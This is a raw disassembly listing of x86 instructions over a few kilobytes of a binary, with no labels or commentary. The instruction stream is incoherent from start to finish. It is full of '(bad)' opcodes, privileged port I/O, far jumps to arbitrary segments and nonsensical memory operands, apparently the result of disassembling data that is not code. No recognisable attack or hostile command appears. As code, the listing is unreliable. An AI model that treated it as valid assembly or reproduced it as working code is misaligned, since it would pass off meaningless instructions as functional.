  412fb7:	rcr    BYTE PTR [edi+ebx*4+0x14daad22],0x5a
  412fbf:	(bad)  
  412fc0:	in     al,0x38
  412fc2:	jle    0x413010
  412fc4:	mov    bl,0x1c
  412fc6:	xlat   BYTE PTR ds:[ebx]
  412fc7:	in     eax,0xf7
  412fc9:	sbb    BYTE PTR [esi+0x4b],dh
  412fcc:	and    dh,BYTE PTR [ebx+0x65]
  412fcf:	in     al,0x6a
  412fd1:	and    bh,BYTE PTR ds:0xb2024ca5
  412fd7:	cwde   
  412fd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd9:	mov    edx,0xc0a29253
  412fde:	pusha  
  412fdf:	cmc    
  412fe0:	stc    
  412fe1:	sbb    ebx,ecx
  412fe3:	sub    esp,esp
  412fe5:	js     0x413054
  412fe7:	aad    0xb
  412fe9:	and    eax,0x590cc073
  412fee:	xor    esp,ecx
  412ff0:	xchg   esi,eax
  412ff1:	(bad)  [eax+0x2b]
  412ff4:	int    0xc9
  412ff6:	fisttp DWORD PTR [eax]
  412ff8:	or     ecx,DWORD PTR [esi+ecx*1-0x2736723f]
  412fff:	xchg   edx,eax
  413000:	push   edi
  413001:	adc    al,0x1c
  413003:	pop    ds
  413004:	je     0x41300f
  413006:	daa    
  413007:	mov    ch,0xc7
  413009:	repnz xchg edi,eax
  41300b:	adc    eax,0xbc562f96
  413010:	mov    bl,ch
  413012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413013:	(bad)  
  413014:	aas    
  413015:	das    
  413016:	lds    edx,FWORD PTR [ebx-0x30]
  413019:	repnz arpl WORD PTR [ebp-0x28ca222c],bx
  413020:	sbb    al,0x9d
  413022:	test   al,0x61
  413024:	mov    esi,ebx
  413026:	pop    ds
  413027:	push   ecx
  413028:	inc    edi
  413029:	jmp    0xd100:0x67809565
  413030:	add    DWORD PTR [edx*8+0x66a3bacc],esi
  413037:	add    al,0x21
  413039:	mov    bl,0x1f
  41303b:	mov    cl,0x9b
  41303d:	jmp    0x413017
  41303f:	ins    DWORD PTR es:[edi],dx
  413040:	xchg   esp,eax
  413041:	and    bl,BYTE PTR [esi-0x2b]
  413044:	test   BYTE PTR ds:0xb9f0daf0,0xc2
  41304b:	mov    dl,0x89
  41304d:	cmp    DWORD PTR [esi],ecx
  41304f:	pop    eax
  413050:	retf   0x274d
  413053:	es leave 
  413055:	pop    ds
  413056:	add    BYTE PTR [edi],dh
  413058:	xor    eax,0x68ee26d8
  41305d:	pop    ds
  41305e:	jo     0x41305d
  413060:	mov    DWORD PTR [ebx],ecx
  413062:	xor    bl,0x6b
  413065:	aam    0xf0
  413067:	sbb    al,0xac
  413069:	cmc    
  41306a:	pop    ebp
  41306b:	rcr    DWORD PTR [eax+0x4b108ab3],cl
  413071:	xchg   BYTE PTR [edi],cl
  413073:	xchg   ecx,eax
  413074:	mov    esp,0x3f160a5
  413079:	fidivr DWORD PTR [edi+0x426a1c23]
  41307f:	aam    0x58
  413081:	jo     0x41304b
  413083:	push   ds
  413084:	mov    fs,ebx
  413086:	mov    ds:0xfd541079,eax
  41308b:	aam    0xa3
  41308d:	sbb    esp,DWORD PTR ds:0xee0fa4ec
  413093:	aam    0x3f
  413095:	adc    bh,0xf9
  413098:	sbb    eax,0x88a2612f
  41309d:	dec    ecx
  41309e:	cmp    al,0x8f
  4130a0:	adc    edx,DWORD PTR [ecx]
  4130a2:	push   ebx
  4130a3:	cmp    edi,edx
  4130a5:	add    dl,BYTE PTR [esi-0x70]
  4130a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130a9:	push   ebp
  4130aa:	jns    0x413105
  4130ac:	add    bh,BYTE PTR [eax+0x16f56f60]
  4130b2:	(bad)
  4130b6:	ret    0x9bac
  4130b9:	inc    eax
  4130ba:	in     eax,0x8f
  4130bc:	fild   DWORD PTR [edx]
  4130be:	sub    eax,0x1f03a28f
  4130c3:	pop    ebx
  4130c4:	(bad)  
  4130c5:	aaa    
  4130c6:	leave  
  4130c7:	mov    ds:0xd4c4af38,eax
  4130cc:	add    eax,0xbf7d81c6
  4130d1:	cmp    ebx,DWORD PTR [ebp-0x26]
  4130d4:	lock lds edx,FWORD PTR [ecx+0x4fb71ad6]
  4130db:	out    dx,eax
  4130dc:	shl    bh,0x2f
  4130df:	scas   eax,DWORD PTR es:[edi]
  4130e0:	scas   al,BYTE PTR es:[edi]
  4130e1:	shr    DWORD PTR [ebx+ebp*4-0x57ed41b4],1
  4130e8:	retf   0x4dc5
  4130eb:	push   edx
  4130ec:	fdiv   st(7),st
  4130ee:	jl     0x4130ed
  4130f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130f1:	(bad)  
  4130f2:	mov    eax,ds:0xf78b65d6
  4130f7:	hlt    
  4130f8:	xor    bl,ah
  4130fa:	cli    
  4130fb:	(bad)  
  4130fc:	lea    edx,[esi]
  4130fe:	push   ecx
  4130ff:	and    DWORD PTR [ebx],ebp
  413101:	stos   DWORD PTR es:[edi],eax
  413102:	daa    
  413103:	pop    ss
  413104:	lock nop
  413106:	sbb    ah,BYTE PTR [eax]
  413108:	mov    BYTE PTR ds:0x4ff37ddb,cl
  41310e:	sbb    eax,0xbc021328
  413113:	mov    ebp,DWORD PTR [edi]
  413115:	stc    
  413116:	xchg   ecx,eax
  413117:	inc    edx
  413118:	cmp    ebp,DWORD PTR [ebx]
  41311a:	pop    ds
  41311b:	cmp    eax,0xa3e300aa
  413120:	push   esi
  413121:	fs adc esp,edx
  413124:	sbb    dl,BYTE PTR [edi+0x3f5e43d3]
  41312a:	inc    esi
  41312b:	ins    BYTE PTR es:[edi],dx
  41312c:	mov    ebx,eax
  41312e:	and    eax,0x5b981588
  413133:	xor    edi,ebx
  413135:	add    eax,0x151c060e
  41313a:	data16 fadd DWORD PTR [esp+eiz*4]
  41313e:	pop    ds
  41313f:	(bad)  
  413140:	into   
  413141:	idiv   DWORD PTR [eax-0x11e1f186]
  413147:	shl    BYTE PTR [ebx],cl
  413149:	dec    ebp
  41314a:	xlat   BYTE PTR ds:[ebx]
  41314b:	aaa    
  41314c:	mov    bl,0xb2
  41314e:	dec    edi
  41314f:	or     al,0xa1
  413151:	imul   esp,DWORD PTR [eax-0x7],0xc35c7baa
  413158:	mov    eax,ebx
  41315a:	xlat   BYTE PTR ds:[ebx]
  41315b:	or     BYTE PTR [eax+0x3],bh
  41315e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41315f:	mov    DWORD PTR ds:0x5db6ea18,0xbb697c90
  413169:	out    dx,eax
  41316a:	out    dx,al
  41316b:	aam    0x2f
  41316d:	pop    edi
  41316e:	sbb    bl,BYTE PTR [esi-0x2e]
  413171:	shl    BYTE PTR [ebx+edx*8+0x55],cl
  413175:	(bad)  
  413176:	xlat   BYTE PTR ds:[ebx]
  413177:	mov    edx,0xde7f86e7
  41317c:	(bad)  
  41317d:	jne    0x4131a5
  41317f:	test   eax,0xc6d98b89
  413184:	loop   0x413199
  413186:	cs ror esi,0x5
  41318a:	loop   0x413118
  41318c:	lods   eax,DWORD PTR ds:[esi]
  41318d:	push   ecx
  41318e:	out    dx,eax
  41318f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413190:	pop    esi
  413191:	cmp    DWORD PTR [esi],ebx
  413193:	shl    DWORD PTR [edi-0x2dbbc49d],cl
  413199:	(bad)  
  41319a:	sub    eax,0xae2fb1d7
  41319f:	stos   BYTE PTR es:[edi],al
  4131a0:	lock sbb eax,0x1db2ec17
  4131a6:	mov    dh,0x25
  4131a8:	or     edi,DWORD PTR [ebx+0x663d124d]
  4131ae:	fistp  QWORD PTR [eax]
  4131b0:	add    bh,BYTE PTR fs:[ebp+ebp*1-0x4e]
  4131b5:	mov    edi,0x16c2c670
  4131ba:	pop    ds
  4131bb:	or     ecx,DWORD PTR [ebx+ecx*1-0x2147d566]
  4131c2:	xchg   ecx,eax
  4131c3:	mov    ds:0x500f7ead,eax
  4131c8:	mov    edi,edx
  4131ca:	shr    BYTE PTR [ebp+0x64],0x9d
  4131ce:	pop    ss
  4131cf:	rcl    DWORD PTR [ebp+0x60d049d7],0x43
  4131d6:	jl     0x4131fe
  4131d8:	xor    dl,dl
  4131da:	sub    al,0xd4
  4131dc:	ja     0x4131cd
  4131de:	dec    esp
  4131df:	ins    BYTE PTR es:[edi],dx
  4131e0:	sbb    eax,0x88350156
  4131e5:	pop    ds
  4131e6:	int    0x1d
  4131e8:	(bad)  
  4131e9:	fcomp  st(1)
  4131eb:	mov    ds:0x48c81ffd,eax
  4131f0:	(bad)  
  4131f1:	lods   eax,DWORD PTR ds:[esi]
  4131f2:	xor    eax,ebp
  4131f4:	clc    
  4131f5:	xchg   BYTE PTR [ebp+esi*1-0x77],bl
  4131f9:	dec    edi
  4131fa:	or     cl,BYTE PTR cs:[edx+0x534e379f]
  413201:	sbb    eax,0x8d767e3c
  413206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413207:	les    ecx,FWORD PTR [ecx-0x17f28883]
  41320d:	retf   
  41320e:	inc    ecx
  41320f:	neg    dl
  413211:	add    dl,BYTE PTR [edi+eax*1-0x44]
  413215:	mov    ds:0x52065ea6,eax
  41321a:	ins    DWORD PTR es:[edi],dx
  41321b:	cmp    esp,DWORD PTR [esi]
  41321d:	sub    al,0xf0
  41321f:	inc    edx
  413220:	sub    esi,ecx
  413222:	in     al,dx
  413223:	(bad)  
  413224:	lahf   
  413225:	add    cl,BYTE PTR [esi]
  413227:	aaa    
  413228:	mov    ds:0x15eee832,eax
  41322d:	or     al,0x6d
  41322f:	shr    DWORD PTR [esi-0x58b48771],1
  413235:	mov    esi,0x6ece9abf
  41323a:	pop    ss
  41323b:	lock adc eax,DWORD PTR [ebx]
  41323e:	push   ss
  41323f:	xor    eax,0x3db1e72f
  413244:	dec    ebp
  413245:	outs   dx,DWORD PTR ds:[esi]
  413246:	ins    BYTE PTR es:[edi],dx
  413247:	cdq    
  413248:	loope  0x41325b
  41324a:	and    al,BYTE PTR [eax+0x3981f788]
  413250:	adc    BYTE PTR [ebx],al
  413252:	dec    edx
  413253:	dec    esi
  413254:	nop
  413255:	cli    
  413256:	js     0x41328d
  413258:	test   ebx,ebp
  41325a:	jl     0x413247
  41325c:	xor    edi,esp
  41325e:	das    
  41325f:	xlat   BYTE PTR ds:[ebx]
  413260:	sbb    al,0x54
  413262:	sahf   
  413263:	mov    ecx,0x2c5742a6
  413268:	lods   al,BYTE PTR ds:[esi]
  413269:	add    eax,0x779f2e40
  41326e:	hlt    
  41326f:	inc    esp
  413270:	push   esp
  413271:	pop    es
  413272:	fwait
  413273:	xchg   edx,edi
  413275:	add    ah,BYTE PTR [edx]
  413277:	and    al,0x64
  413279:	xlat   BYTE PTR ds:[ebx]
  41327a:	jmp    0x4132c4
  41327c:	mov    BYTE PTR [esi-0x3e],dl
  41327f:	pop    es
  413280:	add    eax,DWORD PTR [ebx]
  413282:	(bad)  
  413283:	mov    ch,0x5a
  413285:	jl     0x41326c
  413287:	pusha  
  413288:	mov    BYTE PTR [edi+0x43],al
  41328b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41328c:	stc    
  41328d:	retf   0xadb3
  413290:	fld    DWORD PTR [edx]
  413292:	inc    esi
  413293:	push   eax
  413294:	shr    dh,0xcd
  413297:	adc    cl,BYTE PTR [esi]
  413299:	call   FWORD PTR [edi]
  41329b:	mov    ecx,0xbe575f5f
  4132a0:	retf   0xbd2d
  4132a3:	cwde   
  4132a4:	outs   dx,DWORD PTR ds:[esi]
  4132a5:	std    
  4132a6:	lods   eax,DWORD PTR ds:[esi]
  4132a7:	push   ebp
  4132a8:	je     0x4132b7
  4132aa:	push   0xffffff9a
  4132ac:	add    ah,BYTE PTR [eax]
  4132ae:	pop    ds
  4132af:	outs   dx,DWORD PTR ds:[esi]
  4132b0:	and    al,0x1
  4132b2:	jb     0x413283
  4132b4:	in     al,0xa6
  4132b6:	adc    ch,0xa3
  4132b9:	mov    bh,0x34
  4132bb:	jae    0x4132ef
  4132bd:	or     edx,ebp
  4132bf:	mov    ds:0x151f2d75,al
  4132c4:	jmp    0x413311
  4132c6:	mov    bh,0x26
  4132c8:	pop    eax
  4132c9:	inc    esp
  4132ca:	fwait
  4132cb:	sahf   
  4132cc:	out    0xa4,eax
  4132ce:	int    0x1c
  4132d0:	jo     0x4132d4
  4132d2:	dec    eax
  4132d3:	inc    eax
  4132d4:	jnp    0x413341
  4132d6:	push   es
  4132d7:	ret    0xb77c
  4132da:	pop    ds
  4132db:	call   FWORD PTR [ebx+ebp*4]
  4132de:	cmc    
  4132df:	jns    0x41335b
  4132e1:	and    bl,BYTE PTR [ebp-0x3b]
  4132e4:	sub    eax,DWORD PTR [edx]
  4132e6:	out    dx,al
  4132e7:	(bad)  
  4132e8:	adc    eax,0xf4c584b4
  4132ed:	shl    BYTE PTR [esi-0x55],0xae
  4132f1:	ret    0xd72e
  4132f4:	aaa    
  4132f5:	push   cs
  4132f6:	push   0xcc6a9716
  4132fb:	iret   
  4132fc:	jecxz  0x413300
  4132fe:	mul    dl
  413300:	mov    dh,0x58
  413302:	mov    bh,0x71
  413304:	mov    DWORD PTR [ebp+0x7a],esp
  413307:	mov    BYTE PTR [ecx],bh
  413309:	xor    ecx,DWORD PTR [ecx+0x1b]
  41330c:	pusha  
  41330d:	add    ebx,DWORD PTR [esi+0x37]
  413310:	lea    ebx,[ebp+0x126e4dd8]
  413316:	push   ds
  413317:	idiv   DWORD PTR [ebp-0x3596e172]
  41331d:	and    esp,ebp
  41331f:	(bad)  
  413320:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413321:	cdq    
  413322:	(bad)  
  413324:	sbb    eax,0xb9d42e16
  413329:	rcl    BYTE PTR [esi],0xf5
  41332c:	enter  0x4c43,0xd5
  413330:	or     eax,0x828ef2f
  413335:	dec    ebx
  413336:	sbb    ebp,DWORD PTR [ecx-0x3]
  413339:	ins    DWORD PTR es:[edi],dx
  41333a:	and    eax,0x9fe149d7
  41333f:	mov    ebx,0xd4f4878c
  413344:	ds cmc 
  413346:	mov    ch,0xdd
  413348:	push   edi
  413349:	out    0x90,al
  41334b:	jge    0x4132d5
  41334d:	dec    ebp
  41334e:	add    dl,BYTE PTR [ebp+0x6f5a30ed]
  413354:	in     al,dx
  413355:	add    eax,0x2f6f9fc8
  41335a:	out    0x9b,al
  41335c:	adc    DWORD PTR [edi],0x17f2578e
  413362:	mov    ch,BYTE PTR [eax]
  413364:	bnd jbe 0x413385
  413367:	xchg   ebp,eax
  413368:	mov    eax,0xe9d4bcc1
  41336d:	retf   0x8205
  413370:	cli    
  413371:	int    0xae
  413373:	das    
  413374:	mov    DWORD PTR [ecx+0xd],esi
  413377:	push   es
  413378:	mov    ecx,0xdcb8dae4
  41337d:	add    dl,BYTE PTR [eax]
  41337f:	call   0x3633c3d4
  413384:	jo     0x413351
  413386:	pusha  
  413387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413388:	jb     0x4133c4
  41338a:	lods   eax,DWORD PTR ds:[esi]
  41338b:	add    BYTE PTR [esi],cl
  41338d:	mov    cl,0x65
  41338f:	shl    BYTE PTR [ecx-0x12367465],cl
  413395:	ss out dx,eax
  413397:	adc    ch,BYTE PTR [edi-0x33]
  41339a:	pop    ds
  41339b:	lea    ebx,[esi-0x75be8db5]
  4133a1:	xor    al,0x51
  4133a3:	aam    0x5b
  4133a5:	rcr    BYTE PTR [edx+0x79dd5e1c],1
  4133ab:	pop    ds
  4133ac:	mov    DWORD PTR [ebx+0x6e],edx
  4133af:	ret    0xaeab
  4133b2:	out    dx,eax
  4133b3:	or     eax,0x88fc033c
  4133b8:	in     al,dx
  4133b9:	jbe    0x41336a
  4133bb:	retf   
  4133bc:	neg    BYTE PTR [ebx+0x1f]
  4133bf:	mov    ch,0x48
  4133c1:	jmp    0x73ab44fe
  4133c6:	pop    ebp
  4133c7:	lahf   
  4133c8:	test   al,0x42
  4133ca:	jp     0x4133a0
  4133cc:	xor    al,0x9c
  4133ce:	pop    edx
  4133cf:	jb     0x413374
  4133d1:	push   edx
  4133d2:	outs   dx,DWORD PTR ss:[esi]
  4133d4:	and    BYTE PTR [ebp-0x40],0xe6
  4133d8:	hlt    
  4133d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133da:	pusha  
  4133db:	push   0xc
  4133dd:	pop    ss
  4133de:	cmp    dl,cl
  4133e0:	and    BYTE PTR ds:0xfb8ab5a9,bh
  4133e6:	sub    eax,0x60dce9f7
  4133eb:	mov    ecx,0x8be4e276
  4133f0:	sbb    dl,BYTE PTR [eax+0x7e]
  4133f3:	aam    0xbf
  4133f5:	mov    ds:0xf93710bb,al
  4133fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133fb:	loope  0x413460
  4133fd:	pop    esp
  4133fe:	xchg   edx,eax
  4133ff:	mov    ebp,0xfc93037d
  413404:	pop    esp
  413405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413406:	out    dx,eax
  413407:	jbe    0x4133b6
  413409:	pop    ss
  41340a:	dec    edx
  41340b:	scas   al,BYTE PTR es:[edi]
  41340c:	pop    ebx
  41340d:	sub    al,0xaf
  41340f:	aad    0x1c
  413411:	sbb    eax,0x9b8945f2
  413416:	pop    es
  413417:	or     DWORD PTR [ecx+ebx*8+0x6d],esi
  41341b:	adc    BYTE PTR [ecx+0x3],0x64
  41341f:	sub    ah,BYTE PTR [ebp+0x11]
  413422:	sub    esi,DWORD PTR [eax]
  413424:	(bad)  
  413426:	pusha  
  413427:	ror    eax,0x26
  41342a:	mov    edx,DWORD PTR [edi]
  41342c:	outs   dx,DWORD PTR ds:[esi]
  41342d:	cs dec edx
  41342f:	fimul  WORD PTR [ecx]
  413431:	mov    BYTE PTR [ecx+0x17aec073],dh
  413437:	(bad)  
  413438:	ss out 0x21,al
  41343b:	cs or  al,0xa
  41343e:	push   cs
  41343f:	cdq    
  413440:	mov    BYTE PTR [edi+0x3440f1d9],bl
  413446:	aaa    
  413447:	cmp    esi,DWORD PTR [edx-0x12ad5bfe]
  41344d:	imul   eax,DWORD PTR gs:[ebx-0x1084c8fa],0x55b04bef
  413458:	test   al,0x86
  41345a:	mov    ah,0x30
  41345c:	rol    BYTE PTR [edx],cl
  41345e:	or     al,0xcb
  413460:	fdiv   QWORD PTR [ebx-0x4a]
  413463:	dec    ecx
  413464:	add    BYTE PTR [esi+ebx*1+0x71],ch
  413468:	js     0x413403
  41346a:	xlat   BYTE PTR ds:[ebx]
  41346b:	mov    ah,0xf0
  41346d:	aas    
  41346e:	ret    
  41346f:	aad    0x57
  413471:	xchg   DWORD PTR [esi+edi*4],esp
  413474:	ds jl  0x4134aa
  413477:	sar    cl,0x49
  41347a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41347b:	xlat   BYTE PTR ds:[ebx]
  41347c:	jno    0x413418
  41347e:	popf   
  41347f:	mov    WORD PTR [eax+0x388507b7],?
  413485:	add    ebx,DWORD PTR [edx+esi*4-0x2e]
  413489:	lahf   
  41348a:	mov    dl,0xcc
  41348c:	push   esp
  41348d:	sub    eax,0xe33be745
  413492:	pusha  
  413493:	xlat   BYTE PTR ds:[ebx]
  413494:	and    eax,0xb8f99f79
  413499:	enter  0xeb8b,0x88
  41349d:	(bad)  
  41349e:	pusha  
  41349f:	mov    eax,0xf28115e9
  4134a4:	arpl   WORD PTR [edx-0x50361aa0],bp
  4134aa:	cdq    
  4134ab:	jle    0x413438
  4134ad:	xor    DWORD PTR [edx],ebx
  4134af:	retf   
  4134b0:	mov    bh,0x5
  4134b2:	aam    0x81
  4134b4:	xchg   ecx,eax
  4134b5:	iret   
  4134b6:	les    edi,FWORD PTR [eax-0x79]
  4134b9:	sti    
  4134ba:	pop    ds
  4134bb:	cdq    
  4134bc:	push   ebp
  4134bd:	es xchg edx,eax
  4134bf:	imul   edi,DWORD PTR [eax-0x1d],0x9701d498
  4134c6:	mov    ebp,ecx
  4134c8:	imul   ecx,DWORD PTR [esi],0xffffff99
  4134cb:	xchg   ebx,eax
  4134cc:	mov    DWORD PTR [edi],esp
  4134ce:	push   ss
  4134cf:	and    al,0x11
  4134d1:	dec    esp
  4134d2:	popa   
  4134d3:	in     eax,dx
  4134d4:	daa    
  4134d5:	adc    al,0xbc
  4134d7:	sbb    eax,0xf5f4a92d
  4134dc:	stc    
  4134dd:	sahf   
  4134de:	mov    ah,0x4b
  4134e0:	mov    DWORD PTR [ebp+0x691e02ba],edx
  4134e6:	into   
  4134e7:	ins    DWORD PTR es:[edi],dx
  4134e8:	jno    0x4134ec
  4134ea:	inc    eax
  4134eb:	test   eax,0x6022f344
  4134f0:	xchg   esp,eax
  4134f1:	pop    es
  4134f2:	pusha  
  4134f3:	mov    ds:0x7b6e7a93,eax
  4134f8:	mov    ds:0xa524bb3f,eax
  4134fd:	add    eax,0xdde2071f
  413502:	aas    
  413503:	push   eax
  413504:	and    al,0x11
  413506:	pop    ds
  413507:	sub    eax,0xe682f1cb
  41350c:	mov    cs,WORD PTR [ecx]
  41350e:	pop    es
  41350f:	aam    0xe4
  413511:	in     al,0x72
  413513:	rol    DWORD PTR [ebp-0x77831dc1],1
  413519:	adc    eax,0xaaecb988
  41351e:	lods   eax,DWORD PTR ds:[esi]
  41351f:	enter  0x4b93,0x20
  413523:	sub    al,ch
  413525:	test   DWORD PTR [esp+eiz*2],edx
  413528:	push   0x4a
  41352a:	fwait
  41352b:	out    dx,al
  41352c:	mov    BYTE PTR [ecx+0x24894e86],bl
  413532:	fcom   DWORD PTR [eax]
  413534:	and    eax,0xed185c03
  413539:	cmp    al,0x2c
  41353b:	mov    al,ds:0x371f8619
  413540:	mov    edi,0x5ad6188f
  413545:	push   ebp
  413546:	adc    eax,0x7f67b5d6
  41354b:	imul   eax,DWORD PTR [ebp+0x2f],0xffffff84
  41354f:	je     0x41350a
  413551:	pop    esp
  413552:	push   ds
  413553:	and    eax,0x3c5bd4
  413558:	(bad)  
  413559:	adc    al,0xc1
  41355b:	aam    0x33
  41355d:	dec    esp
  41355e:	cwde   
  41355f:	loopne 0x4135d3
  413561:	dec    ebx
  413562:	dec    eax
  413563:	mov    esp,0x8760a770
  413568:	fwait
  413569:	gs cs (bad) 
  41356c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41356d:	mov    al,ds:0x78c1d565
  413572:	cld    
  413573:	jmp    0x413577
  413575:	xor    al,0x2a
  413577:	sti    
  413578:	mov    BYTE PTR [edi-0x30],cl
  41357b:	ret    
  41357c:	mov    eax,ebx
  41357e:	mov    ds:0x4402e271,eax
  413583:	dec    eax
  413584:	or     DWORD PTR ds:0x65506885,0x1f
  41358b:	outs   dx,DWORD PTR ds:[esi]
  41358c:	jl     0x413526
  41358e:	pop    edx
  41358f:	add    DWORD PTR [eax+0x7bd4eb84],ebp
  413595:	loope  0x4135a6
  413597:	sbb    DWORD PTR [esi+0x14],edx
  41359a:	loope  0x413532
  41359c:	mov    ecx,ecx
  41359e:	loop   0x413553
  4135a0:	xlat   BYTE PTR ds:[ebx]
  4135a1:	jmp    0x8c28:0x343d923
  4135a8:	xchg   ecx,eax
  4135a9:	dec    eax
  4135aa:	adc    edx,DWORD PTR [ecx]
  4135ac:	pextrw ebx,(bad),0xc5
  4135ae:	pop    ds
  4135af:	xchg   DWORD PTR [eax-0x7d],edi
  4135b2:	(bad)  
  4135b3:	jl     0x41353b
  4135b5:	cmp    eax,edi
  4135b7:	aam    0xe3
  4135b9:	in     al,0x45
  4135bb:	gs aaa 
  4135bd:	gs (bad) 
  4135bf:	clc    
  4135c0:	mov    DWORD PTR [ebx-0x23728f04],eax
  4135c6:	fisttp WORD PTR [ebx-0x4dddfa5d]
  4135cc:	cmp    ch,BYTE PTR [edx-0x10]
  4135cf:	mov    esi,0x51ff18f
  4135d4:	je     0x413595
  4135d6:	out    0x75,eax
  4135d8:	shl    DWORD PTR ds:0x16bc211,0xc6
  4135df:	aad    0x77
  4135e1:	dec    edi
  4135e2:	sub    ecx,DWORD PTR [eax]
  4135e4:	pusha  
  4135e5:	call   0x72d:0x778e98ba
  4135ec:	dec    eax
  4135ed:	add    BYTE PTR [eax-0x244276b6],al
  4135f3:	jo     0x4135c5
  4135f5:	add    esi,DWORD PTR [edx+0x11ab4471]
  4135fb:	sub    DWORD PTR [ecx],eax
  4135fd:	mov    ds:0xedb79192,eax
  413602:	pop    edi
  413603:	mov    ds:0x9b67e336,al
  413608:	mov    ebp,0x470ae2dc
  41360d:	sub    DWORD PTR [edi],0x55b252db
  413613:	xor    bl,BYTE PTR [esi-0x6a986cfb]
  413619:	sub    ebx,edi
  41361b:	lahf   
  41361c:	aas    
  41361d:	retf   
  41361e:	pop    esi
  41361f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413620:	test   eax,0x7efd6af8
  413625:	xor    eax,0x73095bd9
  41362a:	leave  
  41362b:	scas   eax,DWORD PTR es:[edi]
  41362c:	push   ds
  41362d:	cli    
  41362e:	in     eax,0xb8
  413630:	cmp    eax,DWORD PTR [ecx]
  413632:	int3   
  413633:	adc    eax,0xb6424d48
  413638:	or     eax,0xca87f0d6
  41363d:	add    eax,0x639b6144
  413642:	aaa    
  413643:	inc    esi
  413644:	stc    
  413645:	add    eax,0x327de0dc
  41364a:	into   
  41364b:	je     0x41365c
  41364d:	mov    eax,ds:0x1267cf60
  413652:	lock mov bh,0x39
  413655:	jle    0x4136cf
  413657:	ins    DWORD PTR es:[edi],dx
  413658:	ins    BYTE PTR es:[edi],dx
  413659:	mov    esp,0xcb1aabc1
  41365e:	lea    esi,[edi+ecx*8]
  413661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413662:	mov    cl,0x0
  413664:	xor    BYTE PTR [esi-0x11b72c5a],bl
  41366a:	xchg   ebp,eax
  41366b:	or     eax,0x104160f3
  413670:	call   0x2cf9924e
  413675:	stos   DWORD PTR es:[edi],eax
  413676:	sbb    edi,DWORD PTR [esi-0xb0d52f7]
  41367c:	jno    0x413648
  41367e:	data16 (bad) 
  413680:	sti    
  413681:	xor    DWORD PTR [eax],esi
  413683:	retf   0xd5f3
  413686:	cwde   
  413687:	ins    DWORD PTR es:[edi],dx
  413688:	or     dh,dh
  41368a:	pop    edx
  41368b:	shl    DWORD PTR [edx],cl
  41368d:	add    al,0x4
  413690:	sub    dh,ch
  413692:	pop    eax
  413693:	push   esi
  413694:	cmp    al,al
  413696:	inc    edx
  413697:	hlt    
  413698:	mov    ecx,0x89051cf5
  41369d:	xchg   DWORD PTR [edx],eax
  41369f:	imul   edi,DWORD PTR [edi-0x5a],0x73a7ab71
  4136a6:	push   eax
  4136a7:	jne    0x413631
  4136a9:	mov    eax,ds:0xf4780b94
  4136ae:	repnz ss mov ch,bl
  4136b2:	xchg   BYTE PTR [edx],ch
  4136b4:	push   ecx
  4136b5:	mov    edx,0x44677520
  4136ba:	data16 hlt 
  4136bc:	pop    edx
  4136bd:	adc    bl,0xc8
  4136c0:	push   esp
  4136c1:	mov    esp,0x25893430
  4136c6:	mov    dh,BYTE PTR [ebx+0x2439c9c5]
  4136cc:	adc    bl,BYTE PTR [esi+ecx*1]
  4136cf:	cs xchg edx,eax
  4136d1:	(bad)  
  4136d2:	dec    esi
  4136d3:	in     eax,dx
  4136d4:	or     ecx,DWORD PTR [edi]
  4136d6:	pop    es
  4136d7:	je     0x413687
  4136d9:	test   DWORD PTR [ecx],edx
  4136db:	lock sub edx,ecx
  4136de:	dec    ebx
  4136df:	sbb    BYTE PTR [eax-0x8],cl
  4136e2:	lahf   
  4136e3:	add    ebx,DWORD PTR [edi+ecx*8-0x14cd0ab1]
  4136ea:	cli    
  4136eb:	jmp    0xd5ea3dfc
  4136f0:	std    
  4136f1:	mov    BYTE PTR [edx-0x7fbfc4c7],al
  4136f7:	xchg   esi,eax
  4136f8:	mov    DWORD PTR [edi],edi
  4136fa:	in     al,dx
  4136fb:	push   edi
  4136fc:	data16 aas 
  4136fe:	dec    esi
  4136ff:	nop
  413700:	ret    
  413701:	icebp  
  413702:	sahf   
  413703:	leave  
  413704:	loope  0x413708
  413706:	jbe    0x4136e7
  413708:	xor    eax,0x1c04d35d
  41370d:	out    dx,al
  41370e:	pop    ds
  41370f:	mov    cl,0x23
  413711:	mov    al,ds:0x3d18a995
  413716:	repz ror BYTE PTR [eax],1
  413719:	push   eax
  41371a:	mov    ah,0x67
  41371c:	and    al,0x27
  41371e:	fidivr WORD PTR [edx-0xe923d8a]
  413724:	jno    0x41377c
  413726:	or     dh,BYTE PTR [eax]
  413728:	sub    BYTE PTR [edi+edx*4-0x13e38b54],ah
  41372f:	into   
  413730:	add    bl,BYTE PTR [eax+esi*2]
  413733:	mov    ebp,0xd6c0c6ff
  413738:	mov    al,bl
  41373a:	sbb    al,0x4f
  41373c:	mov    DWORD PTR [edi],ecx
  41373e:	dec    ebx
  41373f:	push   ebp
  413740:	add    eax,0xaee5efd4
  413745:	add    eax,0x1ae6b940
  41374a:	fldcw  WORD PTR [ebp+0x131f93b4]
  413750:	and    DWORD PTR [esi],edi
  413752:	(bad)  
  413753:	imul   esp,esi,0x71
  413756:	xor    edx,esp
  413758:	call   0x8bd1ea6e
  41375d:	and    ebp,DWORD PTR [edi]
  41375f:	fisttp DWORD PTR [eax-0x1dfea0b7]
  413765:	jge    0x413796
  413767:	mov    eax,0x4e940366
  41376c:	jg     0x413748
  41376e:	mov    bh,0x51
  413770:	ss (bad) 
  413772:	or     WORD PTR [ebx+0x7],dx
  413776:	pop    esp
  413777:	mov    ebx,ds
  413779:	add    al,0x26
  41377b:	daa    
